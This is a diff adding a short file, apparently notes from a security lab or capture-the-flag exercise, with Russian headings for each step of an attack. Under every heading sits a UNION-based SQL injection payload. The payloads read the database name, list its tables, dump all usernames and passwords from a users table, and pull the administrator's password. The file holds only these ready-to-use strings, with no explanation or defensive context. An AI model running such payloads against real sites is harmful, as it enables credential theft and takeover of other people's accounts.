@@ -1,0 +1,11 @@
+Название базы данных:
+' UNION SELECT 1,DATABASE(),3,4 -- 
+
+Название таблицы с пользователями:
+' UNION SELECT 1,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='first'),3,4 -- 
+
+Информация о пользователях и их паролях:
+' UNION SELECT 1,(SELECT GROUP_CONCAT(username,':',pass SEPARATOR ', ') FROM users),3,4 -- 
+
+Информация об Администраторе и его пароле:
+' UNION SELECT 1,(SELECT pass FROM users WHERE username='Administrator'),3,4 -- 
